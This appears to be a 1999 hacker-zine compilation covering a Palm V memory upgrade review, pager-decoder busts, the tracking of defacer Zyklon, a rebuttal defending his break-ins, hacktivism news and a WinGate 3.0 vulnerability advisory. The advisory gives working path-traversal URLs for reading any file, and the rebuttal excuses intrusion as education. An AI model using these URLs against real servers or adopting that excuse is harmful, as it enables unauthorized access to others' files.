       posted detailed instructions on the Web, with the following warning: 
       
       "You might have to prepare yourself for breaking the machine." 
       
       Kashiwagi used a hairdryer on low power to carefully melt the unit's sealant. 
       After soldering a new RAM chip onto the motherboard, he super-glued
       the two halves back together. 
       
       Electronic Fast Integration Group, an engineering consulting firm based in 
       Los Altos, California, will perform a similar upgrade for US$150. The
       company is planning to offer pre-upgraded units for US$600. 
       
       "This does void the warranty from 3Com," cautioned John Warren, a partner in 
       the firm. "Once we modify them, 3Com won't take them back. They won't support
       the customer at that point, so we have to do it." 
       
       For an extra US$40, EFIG is offering its own one-year warranty, which takes 
       care of everything originally covered under the 3Com warranty. Even though the
       Palm V's 2MBs of memory was made to handle 5,000 addresses, 5 years of 
       appointments, 1,500 to-do items, 1,500 memos and 200 emails, users have been
       clamoring for the upgrades. The success of the Palm has spawned a bewildering
       variety of applications for Web surfing, paging, scheduling, and even street 
       maps and games -- all of which quickly chew up memory. 
       
       Warren said EFIG has been swamped with orders since it began offering the service 
       last week. But he noted that the company had ruined about six Palm V's in the 
       process of refining the procedure, and he cautioned inexperienced hackers from 
       trying it at home. 
       
       "It's a disaster normally," he said. "You have to be prepared to have a few 
       throwaway units." 
       
       News of the upgrade persuaded Albert Lee, a Palm nut who has owned every model of
       the Pilot over the years, to buy the Palm V. "I didn't think I would have the Palm
       V at all if it wasn't for EFIG's upgrade," Lee said. "Two megabytes of memory is 
       just a bit too tight." 
       
       Two days after buying it, Lee shipped his unit to EFIG. It was returned four days 
       later, and Lee wrote a glowing review. 
       
       "I think it was really exceptional work," he said. "I was a little bit worried about
       how they were going to reseal the case. But the results put my doubts to rest." 
       
       "This does void the warranty," said a spokesperson for 3Com. "Our research shows that
       most users don't use two megabytes of memory and would  have a hard time finding a 
       use for eight megabytes."

       personal Palm V.

       <a href="http://www.cavecreations.com/palmv8/">link</a>
       
       Overview
       
       The Palm V (formerly code-named "Razor") is Palm Computing's latest entry into the
       PalmOS palmtop computer line. With this device, Palm Computing reaffirms itself as a
       leader in handheld computing. 
       
       While other competing HPC WinCE devices concentrate on color, more memory, and
       multimedia features, the Palm V retains the most attractive characteristic of PalmOS
       devices -- simple is better. The PalmOS itself has not changed much (PalmOS 3.1)
       over the years. It retains the elegant interface that allows tasks to be completed with
       little learning. While HPCs are becoming more competitive, they require significantly
       faster processors and more memory to perform on par with the PalmOS. 
       
       The Palm V introduces a few improvements which, while evolutionary, are well worth
       the $449 price of entry. Most significant is the sleek new body design, which is slightly
       smaller in length and width than previous Palm devices, but reduces thickness to an
       amazing 0.4". The body is made of anodized aluminum and is easy to hold. This
       design is supplemented by a new Epson display, which significantly improves contrast
       and reduces reflection when compared to earlier Palm devices. 
       
       The contrast dial has been removed, in favor of a software based contrast control
       activated by a button on the top of the unit. The AAA battery bay has been removed in
       favor of an integrated Lithium Ion battery that promises 1 month of use under regular
       conditions. The serial port and HotSync cradle have been redesigned to allow charging
       of the Lithium Ion battery when the unit is resting in the cradle. The Palm V is equipped
       with 2 megabytes of RAM. 
       
       Overall speed has been improved thanks to the new 16mhz Motorola DragonBall EZ
       CPU. This CPU is essentially the same as previous CPUs, but with less wait states.
       Additionally, the PalmOS 3.1 has been recoded and optimized for the EZ processor,
       contributing to the snappy response. 16mhz does not sound very fast until it is
       experienced with the PalmOS. The operating system is extremely efficient, and offers
       virtually no delay. 
       
       Palm V8 by EFIG.com
       
       While Palm V sales have been brisk, keeping prices high, die-hard Palm users had
       much to complain about the Palm V. While they loved the new industrial design, and
       raved about the changes throughout the Palm V, nobody was really that excited about
       the 2 mb of RAM in the unit -- especially since the unit is sealed and non-upgradeable.
       
       Leave it to the netizens to figure out how to open the case and upgrade the Palm V to
       an amazing 8 megabytes of memory! The first prototype came out of Japan thanks to
       Toshio Kashiwagi. This page, was later translated into English by John Lagerling. It
       caused quite a stir. Toshio had successfully unsealed the Palm V without damage,
       and upgraded the memory to 8 mb using a few tools and a new memory chip. 
       
       Suddenly, the Palm V became a lot more appealing. People everywhere wanted the 8
       meg Palm V, but clearly not many people had the skill or the equipment to do the
       upgrade themselves. 
       
       John Figueroa of EFIG.com now offers what everyone has been asking for -- a Palm V
       upgrade service. Mr. Figueroa will upgrade your Palm V to 8 megabytes for the
       surprising low cost of $150.00 USD. Additionally, he plans to sell Palm V units
       pre-installed with 8 megs of memory for $600.00 USD. 
       
       Skeptical? Interested but afraid to ship your $400+ unit to EFIG.com for an upgrade?
       Well... I'm going to take the chance and find out for everyone! Let's find out a little bit
       more about me and my unit. 
       
       Why I Waited
       
       I have every single Palm Computing device since the very first "Pilot", which had no
       backlight! A lot has changed since then, and as every Palm upgrade has come out, I
       could always justify the upgrade. My Palm III went with me everywhere I went, and I
       relied on it to keep my life organized. I have owned Newtons, many HPs
       (100LX,200LX,300LX WinCE), as well as several odd palmtops (anybody still remember
       the Poqet computer?). The Palm Computing line of handheld computers were the first
       ones that didn't end up in the nightstand. Size, weight and simplicity was what
       continued to sell me. 
       
       When the Palm V came out, I was first in line for one -- until I realized there was no
       memory increase from my existing Palm III. Following the history of all my Palm
       devices, memory has always doubled. The Pilot 5000 had 512k, the PalmPilot
       Professional had 1 mb, and the Palm III had 2 mb. While I never really filled up the
       memory of the 2 mb model, I hesitated buying a Palm V because it was
       non-upgradeable -- if it ever came to the point where I needed more than 2 mb of
       memory, I was stuck buying a new unit. In the end, there really is no incentive for me
       to spend $400+ to get a unit with the same amount of memory as my Palm III. 
       
       Preparing for the Palm V8
       
       When John Figueroa of EFIG.com offered his upgrade service for the Palm V, I decided
       it was time to get the Palm V. The elegant design, and a realized 8 mb of memory
       would make this device perfect for my needs. While Mr. Figueroa's business seemed
       to be legitimate, I was still a little skeptical. The fit and finish of the Palm V is
       exceptional -- letting someone crack open such a tightly sealed device is enough to
       make anyone nervous. Things I've taken apart never end up looking the same, or
       working as well. 
       
       But someone always has the be first to try new things. Let's take a look at my Palm V,
       which I purchased brand new from Staples on March 17, 1999.

       These images represent a view of the Palm V from 4 sides. You'll notice that the unit is
       extremely thin, with a very fine seam (only really visible from the top and bottom views).
       
       The Upgrade
       
       The entire upgrade process, from shipping to receiving, should take 4 days. Since I
       shipped on a Thursday, and John is still ramping up for production, it will take slightly
       longer. His overall policy is "In by Monday - ships on Thursday". 
       
       Thursday, March 18, 1999
       John Figueroa gives the go-ahead to ship my Palm V. I back up my entire Palm V
       using BackupBuddy NG, and perform a hard reset. The Palm V hard reset is tricky...
       hold down the power button, press and hold in the reset hole for at least 2 seconds,
       release the reset hole, then release the power button (in that order). Hit Scroll Up to
       erase the memory. I HIGHLY RECOMMEND you use BackupBuddy, even if you never
       upgrade your Palm. Losing data is never fun. 
       
       I stop by Federal Express station in King of Prussia, PA at around 6:30p. I shipped my
       Palm V via FedEx Priority Overnight ($24), and is guaranteed to be at EFIG by 10:30a.
       Remember to have EFIG.com's phone number (408-739-8002) when you ship -- the
       FedEx form has a space for it. 
       
       Friday, March 19, 1999
       Spent the morning on the FedEx website tracking the package. Got a little impatient
       until I realized that there was a 3 hour time difference. :) My Palm V arrived at
       EFIG.com at 9:32a Pacific. The Tracking was as follows:

       It's in John's hands now! John has notified me "We will upgrade it with the first batch of
       the week". 
       
       Monday, March 22, 1999
       John writes me a brief email to confirm my shipping address so that he can pre-print
       labels. Things still look on schedule to receive my unit back toward week's end. 
       
       Tuesday, March 23, 1999
       John has emailed me with the following information: 
       "Your unit has been sealed and is getting our first serial number prototype today at
       11am (my note here: 2:00p Eastern), should ship today too.". 
       
       John emails me to let me know the FedEx tracking number for my package. It's
       guaranteed by 10:30a Wednesday. 
       
       Getting The Unit Back
       
       Wednesday, March 24, 1999
       Today is the big day!!! Here's the FedEx tracking information as my Palm V traveled
       back from Sunnyvale, CA: 
       
       Delivered To : Recipient

            Picked up SUNNYVALE CA 03/23 17:07 
       
       My girlfriend calls at 9:55a -- THE PALM V IS BACK! Took an early break, and drove
       home. 
       
       Looks like the unit was packaged extremely well. It was boxed, and wrapped tightly in
       bubble wrap. The actual unit is in a static safe bag. 
       
       
       
       
       
                                                       
       The unit turns on easily, and the power indicator seems to be down just a little. I
       HotSync and BackupBuddy restores my databases, and my software to pre-shipping
       condition (1.5 mb takes about 10-15 minutes to reload). The power indicator reads 3.96
       volts (4.07 is fully charged on my unit). It's nice to see ALL THAT MEMORY in my
       Palm V. The bottom gap (as mentioned in two other reviews) is minor, but there. If I
       didn't know better, I wouldn't be able to tell. There are no pry marks or scars on the
       unit. 
       
       Initial verdict: The workmanship is exceptional. 8mb is great. Happy to have my unit
       back! 
       
       A Closer Look After the Upgrade
       
       If you're really concerned with how the case looks after the upgrade, you don't need to
       worry that much. There IS a wider gap in the seam, but the case doesn't budge if I try
       to pull it apart, or push the seams together. It isn't that noticeable unless you put two
       units side-by-side (see The Gadgeteer review). It still fits in the Hotsync cradle -- if the
       gap was bad enough, it wouldn't fit. 
       
       
       
       
       
                                                         
       
       Honestly, I don't know what I'm doing with 8 mb of memory. :) I've always gotten by in
       the 2 megs of space in the Palm III. The best thing to do is go ahead and install a
       bunch of programs. 
       
       I hopped online and purchased the AccessGuide to NYC ($14.95) and Quo Vadis
       mapping software by Marcosoft ($64.95). AccessGuide is approximately 230k, and
       Quo Vadis is about 90k for the main program, plus all the maps you want (I went
       ahead and got 2 megs worth of maps for the regions I'm in the most (Philadelphia,
       Boston and New York City). Additionally I downloaded a bunch of DOC files. 
       
       
       
       As you can see, I still can't seem to fill it up. I guess I should be pretty happy! Even if I
       tried, I bet I couldn't get more than 5 megs of software into the Palm before I run out of
       things I want to put on it. 
       
       Performance
       
       I topped off the battery, and started playing. So far, I haven't noticed any performance
       difference, or battery difference. Obviously, I've only had it back for a few hours so I'll
       update with long-term effects as I go along. 
       
       Conclusion
       
       It's only been a few hours, but first and foremost, for $150.00 USD, this is the
       cheapest, and best way to get 8 megs into your Palm V without attempting to do the
       upgrade yourself. Mr. Figueroa has definitely demonstrated his ability to open and
       upgrade the Palm V without damaging the unit. The unit is sturdy, and feels brand new.
       My Palm V was only 2 days old prior to shipping to EFIG.com, so it's good to know
       my unit is still in one piece! 
       
       EFIG.com kept an open line of communication with me throughout the upgrade
       progress. This was especially comforting since they were ramping up for mass
       upgrades -- during even the busiest times, John took a minute to keep me posted. 
       
       I HIGHLY and WHOLEHEARTEDLY recommend the EFIG.com upgrade. There is no
       reason to worry. This one is for real! 
       
       Battery Life
       
       Of all the emails I am getting, 95% of them have asked me, "how has battery life been
       affected?". Well, it's really hard to say at this point. Other than the fact the unit only
       came back recently, the biggest thing is everytime you HotSync, you charge the
       battery (something you should do everyday, anyway). Every night, if you leave it in the
       charger, it tops off your battery. 
       
       In my case, I just add it to my regular evening routine... drop the StarTAC into the
       charging cradle, plug the Thinkpad into the charger, drop the Clik! drive into the
       charging cradle, and now drop the Palm V into the cradle. 
       
       So what if you're away on vacation? Well, I guess you could bring your cradle (it's
       really NOT that big a deal), or buy the travel kit. So enough preaching... you still want
       to know how long the Palm V with 8 megs will last. 
       
       Battery Life Study
       
       EFIG Engineering presented their battery life study, and displays the following
       statistics: 
       
       (follow link to see chart)
       
       As you can see from EFIG.com, while the unit is off, battery drain is more severe vs.
       the stock Palm V. However, battery life is improved while the unit is on and idle. 
       
       Now you've seen their estimates, let's do a real life test. I went ahead and switched my
       Palm V to do an infrared HotSync. This will enable me to be completely without cradle.
       
       I screwed up royally, so my last experiment needs to be ditched. On March 30, I will
       charge up to a full 4.02V and we will document a day-by-day account of battery life
       without charging. 
       
       I will HotSync twice a day via IR, and continue to use my unit like I normally do every
       day (looking up phone records, entering appointments, regular alarms, PocketQuicken,
       tinkering with applications, etc.) 
       
       It's not in a controlled environment, so your results will vary from mine. However, I think
       it will be fairly representative of what typical use will yield with a Palm V upgraded to 8
       mb while AWAY from the cradle -- again, if you HotSync with the cradle, you are
       recharging and the study is useless to you because your battery will keep topping off.

       There's some weird shit going down with decoding radio
       data signals. After the arrest of Bill Cheeks by the
       Secret Service yesterday many people are very nervous
       as to what will come next. Both WinFlex & PocFlex,
       windows/dos pocsag/flex/golay decoders have pulled
       the software as both developers feel as if they're going
       to be under serious legal fire from Motorola. WinMDT
       also pulled it's software, most likely due to the recent
       busts. Interesting that Motorola developed and owns
       the patent on both flex/reflex and mdc4800 (mdt). 

       Here is a mirror of the latest version of some of the MDT
       decoding software. You better grab it now before it too
       disappears.

  28.0 Hot on the trail of Zyklon? BUSTED!

      Hack attack: My search for Zyklon 

      He infiltrated my Web site; I tracked him to his lair 

                     By John Howell 
                     Special to The Star

      My battle with the Nazi-inspired hacker Zyklon began on a
      ordinary Monday last March. 

      At the time, I was computer network supervisor for a large
      Toronto company. I received a call from a fellow employee, who
      told me he thought the company Web site ``looked strange.'' 

      I called up the site on my notebook computer, and what I saw
      stopped me in my tracks. Scrawled across the corporate Web
      page, something which is potentially viewed by tens of
      thousands of people, was the declaration: 

      ``THIS SITE IS 0WN3D BY ZYKLON!'' My site had been
      ``hacked,'' vandalized by an electronic thug. 

      He was very proud of what he'd done. He had named himself for
      Zyklon-B, the gas used by the Nazis to exterminate Jews in the
      concentration camps of World War II. He wrote ``OWN3D''
      instead of ``OWNED'' to imitate the lingo favoured by gangsta
      rappers. 

      I contacted our site's Webmaster and together we replaced the
      vandalized Web page. But the implications of what Zyklon had
      done were much more serious. 

      The feeling of having been violated would not go away. I
      decided to track Zyklon to his lair. 

      I am a computer geek. I spend my whole day working on large
      computer networks. I design, optimize and troubleshoot them. I
      love the way computers work and when they don't it's even
      more fun to psychoanalyze them. 

      And I've been following hacking techniques since I started
      computing in the early 1980s. 

      A hacker exploits weaknesses within computer systems to
      access, modify or destroy the information of the computer. In
      most cases hackers will embarrass a company by changing its
      Web page into a pornography page. The more sophisticated
      hacker will access a computer and never let anyone know. He -
      and it's almost always a ``he'' - just sits and watches and learns,
      plotting destruction. 


               Let's get this straight: Hackers
               are criminals, and smug ones
               at that 



      Let's get this straight: Hackers are criminals, and smug ones at
      that. To hackers, only their immediate team of hacker friends are
      ``elite.'' They hold all other users of the Internet in complete
      contempt, calling them ``lamers.'' 

      On the Internet you are never completely safe. It's like being an
      excellent driver. No matter how good a driver you are, another
      driver can always crash into you. The vast majority of hackers
      these days are copycats following from recipe books of hacks,
      known as ``exploits.'' 

      There are literally thousands of exploits a hacker can do, making
      it pitifully easy to destroy or disable a computer system. 

      After we fixed the damage to our Web site and closed the
      access that Zyklon had used to change it, I got busy finding
      out about him. 

      I began by making many, many searches on my favourite Web
      search sites, Yahoo! and AltaVista. I typed in search terms
      ``Zyklon,'' ``0wn3d,`` ``hack'' and other words, scouring the
      Internet for other examples of Zyklon's destruction. 

      He had been a very busy vandal. My searches showed he had
      hacked hundreds of Web sites in Canada, the U.S. and around
      the world, targeting such major government operations as
      NATO, the United States Information Agency and the 21st
      Century U.S. Government site, which is dedicated to
      ``transforming governments in the 21st Century.'' 

      The targets varied from small interest groups to big government
      agencies. In some cases home pages had been changed to
      porn. In others Zyklon had created a greeting card to his hacker
      associates and in still others he had caused their Web page to
      be ``mirrored'' - electronically linked - to an anarchy site in
      Sweden. 

      I learned that a certain U.S. state's Web site was so open,
      anyone who knew this could send out press releases posing as
      the state governor. 

      A knowledgeable and determined hacker can access a Web
      server completely through a Web browser, the navigation
      program used to surf the Net. This ``exploit'' uses a back door (a
      login that bypasses security) to give access to the Web site's
      main computer server. 

      Changing the company's site is as simple as typing in a single
      short command such as ``This site is 0wn3d by Zyklon'' to a
      Web page from the Web browser. 

      A common attack is to create a program that will send the
      hacker your password then delete itself. It does its work by
      asking you to enter your password, just as you would do
      everyday. 

      The way this would look is that the computer would say:
      ``Login,'' a prompt most computer users see on their screen at
      least once a day. 

      You would then type in your computer access name, receiving
      back the message ``Incorrect Password.'' You would then retype
      your password, thinking you'd made a mistake the first time.
      What you would really have done is fed your password and
      login name to a hacker. 

      I noticed that on some of the sites Zyklon had hacked there was
      mention of what looked to be a chat group, a place where
      computer users congregate online to gab, via a system called
      Internet Relay Chat (IRC). 

      The tip-off was the electronic signature ``#pascal.'' It meant the
      chat group's name was ``Pascal,'' named after a computer
      programming language developed in the 1970s. 

      I did a search of some common IRC groups - also called
      channels - and not only found Pascal, I also found Zyklon. He
      was the owner of the channel. 

      When I entered his realm I was immediately tagged as coming
      from a site that he had hacked. My nickname that I had given
      myself for the chat was ``Roadkill'' - which I figured was
      appropriate, seeing as how Zyklon had tried to run me over. 

      An automatic look-up called a ``bot'' - short for robot - told
      Zyklon who I was. It was the equivalent of walking through a
      metal detector. 

      ``Heh, heh,'' he chortled, as I entered the chat group. 

      Zyklon started bragging to his Pascal cronies about the
      information he had stolen from me. 

      ``The Webmaster's password (at my company) is: ``getout! Ha,
      ha.'' 

      I didn't rise to Zyklon's bait. I held back - ``lurking,'' as it's called
      - to see if Zyklon would further implicate himself. 

      ``You got in?'' said another Pascal member, identified as
      ``Crystalin.'' 

      ``Getout!'' he said, repeating my password. ``Laugh out loud!
      Someone's getting sick of me.'' 

      ``Heh, heh,'' Crystalin chortled. ``What, did they see you?'' 

      ``No, usually not,'' Zyklon replied. ``But they know when
      someone is there working their magic.'' 

      ``You think Roadkill is snooping on us?'' Zyklon asked. ``Cause
      he found my eggy? (short for ``egg drop,'' another term for a
      hack attack). Or do you think he's just got a (corporate) address
      for no reason? Heh, heh.'' 

      Zyklon turned to another Pascal member, named ``Fluxx.'' 

      ``Fluxxy!'' he said. ``I think someone's trying to find me!'' 

      I had just done my own look-up on him. Zyklon knew it, but I
      got the information I was looking for. I could see where he was
      logging in from. 

      This told me what his Internet service provider was and the ID
      he was logged in as. This was telling exactly where he was on
      the Internet, although at this point I still didn't know his real
      name, or what city he was living in. 

      ``Hey Roadkill,'' Zyklon said, addressing me directly. ``Go to
      your Web site.'' He wanted me to run a particular network utility
      that would look up his Internet address. 

      I remained silent and waiting. 

      ``Oh wait! I deleted it!'' Zyklon crowed, taunting me. 

      He went on to admit that he had hacked my site. 

      ``We just hack (he named my company again) all day, that's
      what we do. . . .'' 

      Zyklon was crowing, but the victory was mine. I had located
      him and got him to admit his crime. 

      I now had enough information to take this into a legal setting. I
      talked to a lawyer. The lawyer contacted the FBI computer
      crimes department. Unfortunately, after an initial interest, no
      one at the FBI seemed too interested. This lack of interest
      frustrated me. 


               Victory was mine. I had
               located him and got him to
               admit his crime 



      I even had trouble convincing people that they'd been hacked
      by Zyklon. Unless they could see the damage he'd actually
      done, they wouldn't believe me. One site operator wouldn't
      believe me until I read him his password file over the phone. 

      I knew I had everything to nail Zyklon. I had the times and
      Internet location and address for him. By October, I had his real
      name and age. He was then 17 years old and living in the
      western United States.

      But there it lay for about three months.

      Early this year a close friend of mine contacted me and let me
      know that he was talking with an associate who had told him
      that his company had been hacked. Out of curiosity, he asked
      for the hacker's name.

      When he heard the name Zyklon bells went off. My friend
      remembered all the stories I had told him about my search.

      I sent my friend's contact an e-mail file with all the data I had on
      Zyklon. I did this in the hope it would finally stop him.

      Since I'd last checked on him, Zyklon had been busily hacking
      in Toronto, Florida, Japan, Los Angeles and many other cities
      and countries.

      My friend's friend discovered that a company in Florida was
      being hacked and sent them an e-mail warning them.
      Unfortunately, the Florida company was just trying to find out
      why their computers had crashed. He got a call back within
      hours. The FBI had been called in.

      They set up a trace on the company's Internet access and
      monitored all the Internet sessions. Zyklon was not quite
      finished with the site in Florida, but he soon would be.

      The FBI captured the full hacking session and Zyklon's Internet
      address, his electronic fingerprints.

      Last week, they moved in and arrested Zyklon. He is now being
      charged with computer crime offences. U.S. federal law allows
      every state a hacker passed through on the Internet to press
      charges.

      His computer equipment has been taken away. And apparently,
      his parents are really upset.

      Justice may be delayed, but when it comes it can be so sweet.

 28.1  Rebuttal by Fluxx;
       ~~~~~~~~~~~~~~~~~~
             
      "The Untold Truth About Zyklon, The Security Specialist Trying To Make A Difference."

         Before I begin, let me introduce myself.  I go by the name Fluxx.
       This article is a follow up to the article written by John Howell 
       published on April 3rd.
       
         Clarification being the primary objective.  The previous article
       contained a lot of what I like to call FUD (Fear, Uncertainty & Doubt)
       which usually comes from people lacking the proper information and/or
       knowledge.
       
         I have known "Zyklon" for 3 years now, and we are close friends.
       It sickens me to see some of the vicious slander that Mr. Howell spews
       out without knowing this to actually be fact.  First of all, Zyklon was
       an alias he picked out a few years ago because it was catchy, not 
       because he is some Nazi, like Mr. Howell describes him to be.
       Secondly, his goal is to educate network security administrators of 
       the flaws that their servers are vulnerable to.  As Mr. Howell so cleverly
       pointed out, it's hard to convince a company that they have been breached
       without them actually seeing the damage.  What better way to prove it to
       a large company, other than to modify their corporate webpage?  Sure, it
       still is illegal entry to computer systems, and some could also say
       damaging data, but that remains to be seen.  I have seen countless system
       penetrations from Zyklon in the past, and he has always backed up their
       original html files, and patched their security vulnerabilities, another
       good point Mr. Howell declined to add.  What I would also like to know is,
       why Mr. Howell is so proud of himself having "caught" Zyklon owning up to
       his "crimes" on IRC.  Does he think IRC logs will stand up in court? I'm
       sorry to say my friend, they won't.
       
         There are many different kinds of hackers out there.  Political 
       Activist hackers who do it for a cause.  Malicious hackers who do it
       to cause as much damage as they can, most commonly younger kids on a joy
       ride.  Finally, you've got the average hacker who's curiosity gets the
       best of him, and all he strives for is to learn, secure and move on.
       Getting inside of a hackers head is a ride not many have the chance to
       take.  Most commonly refered to as Generation-X techno kids, hackers are
       not always kids.  I personally know hackers who are grandfathers.  It has
       become a lifestyle in the 90's, and the world has finally come to realize
       that.
       
         As technology progresses faster and faster every day towards the year
       2000, Internet and corporate network security tightens up ever so slowly.
       In most cases, that's thanks to people like Zyklon.  The world wide web has
       become a huge medium for companies, and business is good.  Customers
       appreciate stable tight security for their sites, they do not expect to
       pop up their webpage one Sunday morning and have happy faces all over it.
       Essentially, breaking down server security now, is the most efficient way
       in making people more aware of the rising threat.  Classically, most
       webservers run or have access to some sort of cgi-bin directory, which
       contains many programs available to the advanced browsing user to issue
       remote commands to the internal server, to retrieve issued requests.  Now
       for normal folk, they would never see these.  They would have no need to
       see them, but for a hacker its the peephole staring directly into the soul
       of the machine.  Mr. Howell also mentioned this, describing it as
       "a back door (a login that bypasses security) to give access to the Web
       site's main computer server".  This is not entirely true.  What occurs is
       the WWW server software has access levels it needs to fulfill to run one of
       the cgi-bin programs. A website that is on-line with one of the many
       vulnerable cgi-bin programs is now open to be exploited. This cgi-bin may
       be used to issue commands to the computer, remotely (not from the keyboard)
       to the operating system.  A hackers light at the end of the tunnel,
       metaphorically speaking.  Don't get me wrong, this isn't the only way
       hackers exploit systems.  This is one (quite old technique) that STILL is
       vulnerable on thousands of machines spanning across the world.
       
         In the end, hackers will always be here, and like life has shown us, there
       are always good and bad points to every argument.  Let us sit, and idly
       ponder why such brilliant computer specialists are not working for these
       large corporatations.  Kinda makes you wonder what the current security
       administrators are doing, eh?

           LOOK! Up on the Internet. Is it the X Files? Is it Star Wars? 
           Is it Ghostbusters? No, it's the X-Force. This
           offshoot of Internet Security Systems is looking to

           join its worldwide team dedicated to truth, justice,
           and uncovering new security risks. 
    
                         There's a thin line of bits and
                         bytes between the good and

                             Some, like Star Wars' Darth
          Vader, choose to go over to the dark side and use
          their powers to bring down governments,
          multinationals, and corporations. Others, like Luke
          Skywalker, use their abilities in the service of ISS to
          warn subscribers of threats to their operating
          systems, applications and networks. 
    
          Laskowski is searching for a very rare kind of

          understand computer architecture, and have been
          hacking for many years. 
    
          ``We're looking for someone who can keep their
          finger on the pulse of the underground hacking
          community, yet who can look at applications to find
          their vulnerabilities,'' Laskowski says. 
    
          ISS says that applications, particularly from
          Microsoft, are the new favorite for hackers. ``Bill
          Gates is targetted particularly because he's the
          antithesis of the hacker mentality,'' Laskowski says. 
    
          When Laskowski finds a suitable local Jedi, she or
          he won't have to worry about splashing out on
          corporate suits and high heels. ``In our head office
          at Atlanta, X-Force team members' workmates
          include two snakes, one iguana, and three spiders,''
          Laskowski says. 
    
          ISS is already sending out warnings to corporate
          subscribers that solutions to the Y2K problem may
          become security issues themselves. ``Businesses
          are locking down apps so they're Y2K-compliant
          and this means there can be no patches. This is a
          hackers' bonanza. 
    
          ``Second, Y2K is an industrial espionage minefield.
          Hackers are waiting until after 1 January 2000 to
          break in, knowing that the blame will be directed at
          the Y2K solution, not the hacker." 
    
          Australia is increasingly important in The Empire.
          ISS's 25-year-old founder, Chris Klaus, is paying a
          physical - as opposed to a virtual - visit next month,
          and the X-Force's chief sweat shirt, Christopher
          Rouland, is beaming over in June.

  30.0  More on hacktivism from the Globe...
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

      Electronic infiltration is burgeoning war
      zone of hackers worldwide 

      By Patti Hartigan, Globe Staff, 04/03/99 

        B eavis and Butt-head, the cackling cartoon characters, stare out from a
          NASA Web page, their fists raised in a sort of virtual protest. These
      familiar figures from American popular culture are hardly the new image of
      the space agency: The site was ''hacked,'' or corrupted, yesterday by a
      group of Russian computer experts who posted the same message on a
      NATO Web site in Egypt. The hacked sites, signed ''From Russia With
      Love,'' are scrawled with a profane message denouncing NATO as well as a
      demand for allied troops to ''Go away from Kosovo.''

      While the real war in the Balkans is waged on the ground and in the air, a
      virtual war is being fought in cyberspace. In the past few days, hackers on
      both sides of the conflict have been defacing Web sites with electronic
      graffiti and launching programs designed to slow down or crash their
      opponents' servers. 

      On Wednesday, the NATO server in Belgium was bombarded with
      thousands of e-mail messages from Yugoslav hackers that overloaded its
      Web site. Another group, called ''Russian Hackers Union,'' defaced a US
      Navy site.

      Hacking groups in the United States and Europe are retaliating with their
      own graffiti. Team Spl0it, a coalition that includes an 18-year-old American
      hacker, broke into several Web sites and posted such antiwar slogans as,
      ''Tell your governments to stop the war.'' Hackers on the West Coast are
      trying to crack the Serb government site, although the server is said be
      extremely secure and based in London. And the Kosovo Hackers Group, a
      coalition of European and Albanian hackers, has erased at least five sites
      and replaced them with black and red ''Free Kosovo'' banners.

      In what is being called the first Internet war, hackers are emerging as
      electronic vigilantes. At the same time that governments are inundating the
      Internet with propaganda and individuals are using the medium to
      communicate, hackers have actually taken the battle into their own hands,
      performing military exercises with the click of a mouse.

      It's called ''hacktivism,'' the marriage of computer hacking and political
      activism. This form of protest has been around since 1995, when hackers
      became politicized to support convicted hacker Kevin Mitnick. Most
      electronic civil disobedience is illegal in the United States, but this is the first
      time it has been employed during an international conflict, and there is no
      precedent that governs such conduct.

      Michael Vatis, chief of the FBI's National Infrastructure Protection Center,
      said through a spokesman yesterday that he had no comment on the recent
      rage of hacktivism. 

      In past international conflicts, governments have successfully disrupted the
      telecommunications systems of their opponents. But in the age of the
      Internet, this is the first time that private citizens have been able to jump into
      the fray.

      ''This is the harbinger of things to come,'' said Barry Steinhardt, former
      president of the Electronic Frontier Foundation and associate director of the
      American Civil Liberties Union. ''It's a free and open network. Parts of it are
      sealed off, but it's a porous network. It's inevitable that you're going to get
      vigilantes acting in an extralegal way.''

      Hackers have traditionally objected to attempts to curtail free speech, and
      American hackers are outraged by Serb government censorship. One
      member of Team Spl0it, an 18-year-old resident of the East Coast who
      goes by the handle f0bic said in an e-mail message that he and others
      decided to take action a few weeks ago. ''I, along with the rest of my team,
      decided to get the message out on the Internet,'' he wrote. ''Our message
      was bright and clear: Stop the war before we go to World War III.'' The
      Globe has confirmed his existence, but he asked that his name not be used.

      In the past, the Electronic Frontier Foundation, a leader in Internet policy,
      has contended that hacktivism is illegal and can be neither encouraged nor
      condoned. But that may change in an international conflict. 

      ''We may want to reevaluate that in light of the historical importance that civil
      disobedience has played as a means of protest,'' said Alex Foster, the
      foundation's director of public affairs. ''Does hacktivism change in a crisis
      situation? I don't have an answer on that yet.''

      Foster warned that ordinary citizens who are using the Internet to
      communicate their own political opinions legally should be careful, though.
      ''People in Serbia who are using the Internet for normal things like sending
      e-mail may be putting themselves at great risk,'' he said. 

      But US and Russian hacktivists continue their cyberwar unconcerned about
      repercussions. ''We are activists because we see there are wrongs that need
      to be corrected,'' f0bic wrote.

  31.0 WinGate 3.0 problems
       ~~~~~~~~~~~~~~~~~~~~

       Subject: Multiple WinGate Vulnerabilities[Tad late]
       
       At first we were just going to post this advisory to our website but after
       the subject came up on the NTSEC list and we got a few emails telling us to
       post it to the other lists... well here it is.

       Multiple WinGate Vulnerabilities
       
       Systems Affected
       WinGate 3.0
       
       Release Date
       February 22, 1999
       
       Advisory Code
       AD02221999
       
       ________________________________________________________________________
       
       Description:
       ________________________________________________________________________
       
       WinGate 3.0 has three vulnerabilities. Read any file on the remote system.
       1. Read any file on the remote system.
       2. DoS the WinGate service.
       3. Decrypt WinGate passwords.
       
       ________________________________________________________________________
       
       Read any file on the remote system
       ________________________________________________________________________
       
       We were debating if we should add this to the advisory or not. We
       figured it would not hurt so here it is.
       The WinGate Log File service in the past has had holes were you can
       read any file on the system and the holes still seem to be there and
       some new ways of doing it have cropped up.
       
       http://www.server.com:8010/c:/ - NT/Win9x
       http://www.server.com:8010// - NT/Win9x
       http://www.server.com:8010/..../ - Win9x
       
       Each of the above URLs will list all files on the remote machine.
       There are a few reasons why we were not sure if we were going to post
       this information.
       
       By default all WinGate services are set so that only 127.0.0.1
       can use the service. However the use for the log file service is to let
       users remotely view
       the logs so therefore chances are people using the log file service
       are not going to be leaving it on 127.0.0.1. Also by default in the
       WinGate settings "Browse" is enabled. We are not sure if the developers
       intended the Browse option to mean the whole hard drive. We would hope
       not.
       
       The main reason we did put this in the advisory is the fact that
       the average person using WinGate (Cable Modem Users etc..) are not the
       brightest of people and they will open the Log Service so that everyone
       has access to it. We understand there are papers out there saying not
       to do this and even the program it self says not to, but the average
       person will not let this register in their head as a bad thing so the
       software should at least make it as secure as possible. Letting people
       read any file is not living to that standard. Any way, lets move on...
       ________________________________________________________________________
       
       DoS the WinGate Service
       ________________________________________________________________________
       
